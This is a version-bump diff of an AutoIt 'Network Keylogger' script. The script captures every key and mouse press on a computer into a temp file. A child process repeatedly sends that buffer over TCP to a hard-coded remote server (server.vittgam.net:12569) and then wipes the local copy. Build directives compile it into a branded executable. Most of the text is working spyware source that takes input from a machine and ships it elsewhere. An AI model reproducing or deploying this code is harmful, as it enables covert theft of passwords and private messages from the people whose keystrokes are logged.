@@ -1,5 +1,5 @@
 #cs
-	Network Keylogger - Sends every key pressed in a computer to another computer, via TCP/IP.
+	Network Keylogger v1.0.0.1 - Sends every key pressed in a computer to another computer, via TCP/IP.
 	Copyright © 2010 VittGam - NetworkKeylogger@VittGam.net
 
 	License information:
@@ -25,14 +25,14 @@
 #AutoIt3Wrapper_icon=vittgam.ico
 #AutoIt3Wrapper_outfile=network_keylogger.exe
 #AutoIt3Wrapper_Compression=4
-#AutoIt3Wrapper_Res_Comment=Network Keylogger v1.0 by VittGam
+#AutoIt3Wrapper_Res_Comment=Network Keylogger v1.0.0.1 by VittGam
 #AutoIt3Wrapper_Res_Description=Network Keylogger
-#AutoIt3Wrapper_Res_Fileversion=1.0.0.0
+#AutoIt3Wrapper_Res_Fileversion=1.0.0.1
 #AutoIt3Wrapper_Res_LegalCopyright=Copyright © 2010 VittGam
 #AutoIt3Wrapper_Res_Field=InternalName|network_keylogger
 #AutoIt3Wrapper_Res_Field=ProductName|Network Keylogger
 #AutoIt3Wrapper_Res_Field=CompanyName|VittGam (www.VittGam.net)
-#AutoIt3Wrapper_Res_Field=ProductVersion|1.0.0.0
+#AutoIt3Wrapper_Res_Field=ProductVersion|1.0.0.1
 #AutoIt3Wrapper_Res_Field=OriginalFilename|network_keylogger.exe
 #AutoIt3Wrapper_Res_SaveSource=n
 #AutoIt3Wrapper_Res_Language=1033
@@ -44,7 +44,52 @@
 Global $server_addr="server.vittgam.net"
 Global $server_port="12569"
 
-Global $keylog_filename=@TempDir&"\tempbuffer-"&Random(1000000,9999999,1)&".txt"
+Global $keylog_filename=@TempDir&"\tempbuffer.txt"
+Global $buffer=""
+Global $connected=0
+Global $socket=-1
+If $CmdLine[0] > 0 Then
+	If Execute("$CmdLine[1]") = "/child" And Execute("$CmdLine[2]") <> "" Then
+		TCPStartup()
+		OnAutoItExitRegister("Cleanup2")
+		While 1
+			$buffer=FileRead($keylog_filename)
+			If $buffer <> "" Then
+				If $connected Then
+					TCPSend($socket,$buffer)
+					If @error Then
+						TCPCloseSocket($socket)
+						$connected=0
+					Else
+						FileClose(FileOpen($keylog_filename,2))
+					EndIf
+				EndIf
+				If Not $connected Then
+					$socket=TCPConnect(TCPNameToIP($server_addr),$server_port)
+					If $socket = -1 Then
+						TCPCloseSocket($socket)
+					Else
+						$connected=1
+						TCPSend($socket,$buffer)
+						If @error Then
+							TCPCloseSocket($socket)
+							$connected=0
+							Sleep(10000)
+						Else
+							FileClose(FileOpen($keylog_filename,2))
+						EndIf
+					EndIf
+				EndIf
+			EndIf
+			If Not ProcessExists(Execute("$CmdLine[2]")) Then
+				If FileRead($keylog_filename) = "" Then FileDelete($keylog_filename)
+				Exit
+			EndIf
+			Sleep(750)
+		WEnd
+	EndIf
+	Exit
+EndIf
 Global $keys_01="{MOUSELEFT}"
 Global $keys_02="{MOUSERIGHT}"
 Global $keys_04="{MOUSEMIDDLE}"
@@ -186,49 +231,7 @@ Global $keys_DC="\"
 Global $keys_DD="ì"
 Global $keys_DE="à"
 Global $doing=0
-Global $buffer=""
-Global $connected=0
-Global $socket=-1
 Global $childpid=-1
-If $CmdLine[0] = 2 Then
-	If Execute("$CmdLine[1]") = "/child" And Execute("$CmdLine[2]") <> "" Then
-		TCPStartup()
-		OnAutoItExitRegister("Cleanup2")
-		While 1
-			$buffer=FileRead($keylog_filename)
-			If $buffer <> "" Then
-				If $connected Then
-					TCPSend($socket,$buffer)
-					If @error Then
-						TCPCloseSocket($socket)
-						$connected=0
-					Else
-						FileClose(FileOpen($keylog_filename,2))
-					EndIf
-				EndIf
-				If Not $connected Then
-					$socket=TCPConnect(TCPNameToIP($server_addr),$server_port)
-					If $socket = -1 Then
-						TCPCloseSocket($socket)
-					Else
-						$connected=1
-						TCPSend($socket,$buffer)
-						If @error Then
-							TCPCloseSocket($socket)
-							$connected=0
-							Sleep(10000)
-						Else
-							FileClose(FileOpen($keylog_filename,2))
-						EndIf
-					EndIf
-				EndIf
-			EndIf
-			If Not ProcessExists(Execute("$CmdLine[2]")) Then Exit
-			Sleep(750)
-		WEnd
-	EndIf
-	Exit
-EndIf
 Logger("Keylogger started")
 Global $new=WinGetTitle("[active]")
 Global $old=$new
